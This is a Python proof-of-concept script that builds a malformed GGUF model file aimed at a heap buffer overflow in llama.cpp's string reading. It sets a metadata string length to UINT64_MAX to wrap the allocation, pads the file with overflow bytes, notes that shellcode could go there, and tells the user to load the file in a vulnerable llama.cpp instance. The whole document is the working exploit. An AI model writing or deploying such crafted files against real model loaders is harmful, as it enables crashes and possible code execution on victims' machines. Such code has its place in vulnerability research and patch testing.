import struct

# Function to generate a malicious GGUF file exploiting heap overflow in string reading
def generate_malicious_gguf(filename='malicious.gguf'):
    with open(filename, 'wb') as f:
        # GGUF header
        f.write(b'GGUF')  # Magic number
        f.write(struct.pack('<I', 2))  # Version (common in GGUF v2)
        f.write(struct.pack('<Q', 0))  # Tensor count (0 to minimize file size)
        f.write(struct.pack('<Q', 1))  # Metadata key-value count (1 for PoC)
        
        # Malicious metadata key: Set string length to UINT64_MAX to trigger allocation overflow
        malicious_length = 0xffffffffffffffff  # Causes wraparound in allocation (n + 1 -> 0)
        f.write(struct.pack('<Q', malicious_length))  # Write the oversized length
        
        # Partial payload data (to simulate read overflow; in real exploit, this could be shellcode)
        # We write a small amount as the full length is impractical, but it triggers the vuln during fread
        overflow_payload = b'A' * 1024  # Arbitrary data to overflow the undersized buffer
        f.write(overflow_payload)
    
    print(f"Malicious GGUF file generated: {filename}")
    print("Load this file in a vulnerable llama.cpp instance to trigger the heap buffer overflow.")

# Run the function
if __name__ == "__main__":
    generate_malicious_gguf()
